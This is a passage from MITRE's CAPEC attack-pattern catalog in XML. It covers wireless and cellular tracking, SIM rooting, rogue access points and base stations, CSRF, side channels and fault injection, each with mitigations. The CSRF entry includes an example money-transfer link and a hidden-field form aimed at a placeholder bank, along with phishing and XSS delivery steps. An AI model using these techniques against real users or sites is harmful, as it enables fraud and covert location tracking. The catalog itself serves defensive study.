         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="292"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>None</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Open source and commercial software tools are available and several commercial advertising companies routinely set up tools to collect and monitor MAC addresses.</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>Automatic randomization of WiFi MAC addresses</Mitigation>
            <Mitigation>Frequent changing of handset and retransmission device</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="201"/>
            <Related_Weakness CWE_ID="300"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="613" Name="WiFi SSID Tracking" Abstraction="Detailed" Status="Draft">
         <Description>In this attack scenario, the attacker passively listens for WiFi management frame messages containing the Service Set Identifier (SSID) for the WiFi network. These messages are frequently transmitted by WiFi access points (e.g., the retransmission device) as well as by clients that are accessing the network (e.g., the handset/mobile device). Once the attacker is able to associate an SSID with a particular user or set of users (for example, when attending a public event), the attacker can then scan for this SSID to track that user in the future.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="292"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>None</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Open source and commercial software tools are available and open databases of known WiFi SSID addresses are available online.</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>Do not enable the feature of "Hidden SSIDs” (also known as “Network Cloaking”) – this option disables the usual broadcasting of the SSID by the access point, but forces the mobile handset to send requests on all supported radio channels which contains the SSID. The result is that tracking of the mobile device becomes easier since it is transmitting the SSID more frequently.</Mitigation>
            <Mitigation>Frequently change the SSID to new and unrelated values</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="201"/>
            <Related_Weakness CWE_ID="300"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="614" Name="Rooting SIM Cards" Abstraction="Detailed" Status="Draft">
         <Description>SIM cards are the de facto trust anchor of mobile devices worldwide. The cards protect the mobile identity of subscribers, associate devices with phone numbers, and increasingly store payment credentials, for example in NFC-enabled phones with mobile wallets. This attack leverages over-the-air (OTA) updates deployed via cryptographically-secured SMS messages to deliver executable code to the SIM. By cracking the DES key, an attacker can send properly signed binary SMS messages to a device, which are treated as Java applets and are executed on the SIM. These applets are allowed to send SMS, change voicemail numbers, and query the phone location, among many other predefined functions. These capabilities alone provide plenty of potential for abuse.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="186"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>A SIM card that relies on the DES cipher.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">This is a sophisticated attack, but detailed techniques are published in open literature.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Upgrade the SIM card to use the state-of-the-art AES or the somewhat outdated 3DES algorithm for OTA.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="327"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-486"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Rooting SIM CardS</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="615" Name="Evil Twin Wi-Fi Attack" Abstraction="Detailed" Status="Draft">
         <Description>Adversaries install Wi-Fi equipment that acts as a legitimate Wi-Fi network access point. When a device connects to this access point, Wi-Fi data traffic is intercepted, captured, and analyzed. This also allows the adversary to act as a “man-in-the-middle” for all communications.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="616"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>None</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>Intercept and control Wi-Fi data communications to/from mobile device.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Commercial defensive technology that monitors for rogue Wi-Fi access points, man-in-the-middle attacks, and anomalous activity with the mobile device baseband radios.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="300"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="616" Name="Establish Rogue Location" Abstraction="Standard" Status="Stable">
         <Description>An adversary provides a malicious version of a resource at a location that is similar to the expected location of a legitimate resource. After establishing the rogue location, the adversary waits for a victim to visit the location and access the malicious resource.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="154"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>A resource is expected to available to the user.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Adversaries can often purchase low-cost technology to implement rogue access points.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Other</Impact>
               <Note>Successful attacks of this nature can result in a wide variety of consequences and negatively impact confidentiality and integrity based on the adversary's subsequent actions.</Note>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Patiently Waiting at Incorrect Location</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="617" Name="Cellular Rogue Base Station" Abstraction="Detailed" Status="Draft">
         <Description>In this attack scenario, the attacker imitates a cellular base station with his own “rogue” base station equipment. Since cellular devices connect to whatever station has the strongest signal, the attacker can easily convince a targeted cellular device (e.g. the retransmission device) to talk to the rogue base station.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="616"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>None</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">This technique has been demonstrated by amateur hackers and commercial tools and open source projects are available to automate the attack.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>Intercept and control cellular data communications to/from mobile device.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Passively monitor cellular network connection for real-time threat detection and logging for manual review.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="618" Name="Cellular Broadcast Message Request" Abstraction="Detailed" Status="Draft">
         <Description>In this attack scenario, the attacker uses knowledge of the target’s mobile phone number (i.e., the number associated with the SIM used in the retransmission device) to cause the cellular network to send broadcast messages to alert the mobile device. Since the network knows which cell tower the target’s mobile device is attached to, the broadcast messages are only sent in the Location Area Code (LAC) where the target is currently located. By triggering the cellular broadcast message and then listening for the presence or absence of that message, an attacker could verify that the target is in (or not in) a given location.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="292"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker must have knowledge of the target’s mobile phone number.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Open source and commercial tools are available for this attack.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>An attacker could verify that the target is in (or not in) a given location.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Frequent changing of mobile number.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="201"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-487"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Description Summary, References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="619" Name="Signal Strength Tracking" Abstraction="Detailed" Status="Draft">
         <Description>In this attack scenario, the attacker passively monitors the signal strength of the target’s cellular RF signal or WiFi RF signal and uses the strength of the signal (with directional antennas and/or from multiple listening points at once) to identify the source location of the signal. Obtaining the signal of the target can be accomplished through multiple techniques such as through Cellular Broadcast Message Request or through the use of IMSI Tracking or WiFi MAC Address Tracking.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="292"/>
         </Related_Attack_Patterns>
         <Skills_Required>
            <Skill Level="Low">Commercial tools are available.</Skill>
         </Skills_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="201"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="62" Name="Cross Site Request Forgery" Abstraction="Standard" Status="Draft">
         <Description>An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply "riding" the existing session cookie.</Description>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Session Riding</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="21"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Explore target website] The attacker first explores the target website to determine pieces of functionality that are of interest to him (e.g. money transfers). The attacker will need a legitimate user account on the target website. It would help to have two accounts.</Description>
               <Technique>Use web application debugging tool such as WebScarab, Tamper Data or TamperIE to analyze the information exchanged between the client and the server</Technique>
               <Technique>Use network sniffing tool such as Wireshark to analyze the information exchanged between the client and the server</Technique>
               <Technique>View HTML source of web pages that contain links or buttons that perform actions of interest.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Create a link that when clicked on, will execute the interesting functionality.] The attacker needs to create a link that will execute some interesting functionality such as transfer money, change a password, etc.</Description>
               <Technique>Create a GET request containing all required parameters (e.g. https://www.somebank.com/members/transfer.asp?to=012345678901&amp;amt=10000)</Technique>
               <Technique>Create a form that will submit a POST request (e.g. &lt;form method="POST" action="https://www.somebank.com/members/transfer.asp"&gt;&lt;input type="hidden" Name="to" value="012345678901"/&gt;&lt;input type="hidden" Name="amt" value="10000"/&gt;&lt;input type="submit" src="clickhere.jpg"/&gt;&lt;/form&gt;</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Convince user to click on link] Finally, the attacker needs to convince a user that is logged into the target website to click on a link to execute the CSRF attack.</Description>
               <Technique>Execute a phishing attack and send the user an e-mail convincing him to click on a link.</Technique>
               <Technique>Execute a stored XSS attack on a website to permanently embed the malicious link into the website.</Technique>
               <Technique>Execute a stored XSS attack on a website where an XMLHTTPRequest object will automatically execute the attack as soon as a user visits the page. This removes the step of convincing a user to click on a link.</Technique>
               <Technique>Include the malicious link on the attackers' own website where the user may have to click on the link, or where an XMLHTTPRequest object may automatically execute the attack when a user visits the site.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Skills_Required>
            <Skill Level="Medium">The attacker needs to figure out the exact invocation of the targeted malicious action and then craft a link that performs the said action. Having the user click on such a link is often accomplished by sending an email or posting such a link to a bulletin board or the likes.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>All the attacker needs is the exact representation of requests to be made to the application and to be able to get the malicious link across to a victim.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.</Mitigation>
            <Mitigation>Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.</Mitigation>
            <Mitigation>Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.</Mitigation>
            <Mitigation>In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>While a user is logged into his bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email.</xhtml:p>
               <xhtml:p>The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account.</xhtml:p>
               <xhtml:p>The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie.</xhtml:p>See also: Cross-site request forgery (CSRF) vulnerability in util.pl in @Mail WebMail 4.51 allows remote attackers to modify arbitrary settings and perform unauthorized actions as an arbitrary user, as demonstrated using a settings action in the SRC attribute of an IMG element in an HTML e-mail.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="352"/>
            <Related_Weakness CWE_ID="306"/>
            <Related_Weakness CWE_ID="664"/>
            <Related_Weakness CWE_ID="732"/>
            <Related_Weakness CWE_ID="716"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-62"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Alternate_Terms, Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, References</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Cross Site Request Forgery (aka Session Riding)</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="620" Name="Drop Encryption Level" Abstraction="Standard" Status="Draft">
         <Description>An attacker forces the encryption level to be lowered, thus enabling a successful attack against the encrypted data.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="212"/>
         </Related_Attack_Patterns>
         <Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="757"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="621" Name="Analysis of Packet Timing and Sizes" Abstraction="Detailed" Status="Draft">
         <Description>An attacker may intercept and log encrypted transmissions for the purpose of analyzing metadata such as packet timing and sizes. Although the actual data may be encrypted, this metadata may reveal valuable information to an attacker. Note that this attack is applicable to VOIP data as well as application data, especially for interactive apps that require precise timing and low-latency (e.g. thin-clients).</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="189"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Use of untrusted communication paths enables an attacker to intercept and log communications, including metadata such as packet timing and sizes.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">These attacks generally require sophisticated machine learning techniques and require traffic capture as a prerequisite.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>Derive sensitive information about encrypted data.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Distort packet sizes and timing at VPN layer by adding padding to normalize packet sizes and timing delays to reduce information leakage via timing.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="201"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="622" Name="Electromagnetic Side-Channel Attack" Abstraction="Detailed" Status="Draft">
         <Description>In this attack scenario, the attacker passively monitors electromagnetic emanations that are produced by the targeted electronic device as an unintentional side-effect of its processing. From these emanations, the attacker derives information about the data that is being processed (e.g. the attacker can recover cryptographic keys by monitoring emanations associated with cryptographic processing). This style of attack requires proximal access to the device, however attacks have been demonstrated at public conferences that work at distances of up to 10-15 feet. There have not been any significant studies to determine the maximum practical distance for such attacks. Since the attack is passive, it is nearly impossible to detect and the targeted device will continue to operate as normal after a successful attack.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="189"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Proximal access to the device.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Sophisticated attack, but detailed techniques published in the open literature.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>Derive sensitive information about encrypted data. For mobile devices, depending on which keys are compromised, the attacker may be able to decrypt VOIP communications, impersonate the targeted caller, or access the enterprise VPN server.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Utilize side-channel resistant implementations of all crypto algorithms.</Mitigation>
            <Mitigation>Strong physical security of all devices that contain secret key information. (even when devices are not in use)</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="201"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="623" Name="Compromising Emanations Attack" Abstraction="Detailed" Status="Draft">
         <Description>Compromising Emanations (CE) are defined as unintentional signals which an attacker may intercept and analyze to disclose the information processed by the targeted equipment. Commercial mobile devices and retransmission devices have displays, buttons, microchips, and radios that emit mechanical emissions in the form of sound or vibrations. Capturing these emissions can help an adversary understand what the device is doing.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="189"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Proximal access to the device.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Sophisticated attack.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>Capture vibrations/emissions from the handset or retransmission device display screen to recreat display information from a distance.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>None are known.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="201"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="624" Name="Fault Injection" Abstraction="Meta" Status="Stable">
         <Description>The adversary uses disruptive signals or events (e.g. electromagnetic pulses, laser pulses, clock glitches, etc.) to cause faulty behavior in electronic devices. When performed in a controlled manner on devices performing cryptographic operations, this faulty behavior can be exploited to derive secret key information.</Description>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Side-Channel Attack</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>Physical access to the system</Prerequisite>
            <Prerequisite>The adversary must be cognizant of where fault injection vulnerabilities exist in the system in order to leverage them for exploitation.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Adversaries require non-trivial technical skills to create and implement fault injection attacks. Although this style of attack has become easier (commercial equipment and training classes are available to perform these attacks), they usual require significant setup and experimentation time during which physical access to the device is required.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>
               <xhtml:p>The relevant sensors and tools to detect and analyze fault/side-channel data from a system.</xhtml:p>
               <xhtml:p>A tool capable of injecting fault/side-channel data into a system or application.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
               <Note>An adversary capable of successfully collecting and analyzing sensitive, fault/side-channel information, he or she has compromised the confidentiality of that application or information system data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>If an adversary is able to inject data via a fault or side channel vulnerability towards malicious ends, the integrity of the application or information system will be compromised.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
